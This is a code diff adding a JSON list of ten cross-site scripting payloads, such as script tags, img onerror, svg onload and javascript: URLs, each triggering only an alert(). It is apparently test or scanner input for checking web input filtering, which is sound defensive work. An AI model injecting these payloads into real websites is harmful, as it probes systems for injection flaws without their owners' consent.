@@ -1,0 +1,14 @@
+{
+  "payloads": [
+    "<svg/onload=alert('XSS')>",
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<iframe src='javascript:alert(1)'></iframe>",
+    "<body onload=alert(1)>",
+    "<input onfocus=alert(1)>",
+    "<marquee onstart=alert(1)>Hello</marquee>",
+    "<a href='javascript:alert(1)'>Click me</a>",
+    "<video><source onerror='alert(1)'></video>",
+    "<details open ontoggle=alert(1)>"
+  ]
+}
